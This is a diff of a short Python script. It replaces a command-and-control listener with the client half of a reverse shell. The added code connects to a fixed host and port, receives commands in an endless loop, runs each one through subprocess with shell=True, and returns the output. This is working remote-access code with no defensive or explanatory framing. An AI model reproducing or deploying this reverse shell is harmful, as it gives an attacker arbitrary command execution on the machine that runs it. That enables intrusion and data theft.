@@ -1,31 +1,27 @@
+from ctypes.wintypes import INT
 import socket
+import subprocess
 
-# Get our local IP and a specified port
-HOST = "192.168.73.224"  # '192.168.42.82'
-PORT = 8081  # 2222
-
-new_port = input("Input host port (blank if defauly):")
-if new_port != "\n":
-    REMOTE_PORT = new_port
-
-# Bind the IP to the port -> create a socket
-server = socket.socket()
-server.bind((HOST, PORT))
-
-# Starting the Listener
-print("[+] Server Started")
-print("[+] Listening for Client Connetion...")
-server.listen(1)
-client, client_addr = server.accept()
-print(f"[+] {client_addr} Client connected to server")
+# Setting Up IP/Sockets
+REMOTE_HOST = "127.0.0.1"
+REMOTE_PORT = 8081  # 2222
+client = socket.socket()
 
 
-# Sending and receiving commands in an infinite loop
+# Initializing Connection
+print("[-] Connection Initiating...")
+client.connect((REMOTE_HOST, REMOTE_PORT))
+print("[-] Connection initiated!")
+
+# Runtime Loop
 while True:
-    command = input("Enter command: ")
-    command = command.encode()
-    client.send(command)
-    print("[+] Command sent")
-    output = client.recv(1024)
-    output = output.decode()
-    print(f"Output: {output}")
+    print("[-] Awaiting commands...")
+    command = client.recv(1024)
+    command = command.decode()
+    op = subprocess.Popen(
+        command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE
+    )
+    output = op.stdout.read()
+    output_error = op.stderr.read()
+    print("[-] Sending response...")
+    client.send(output + output_error)
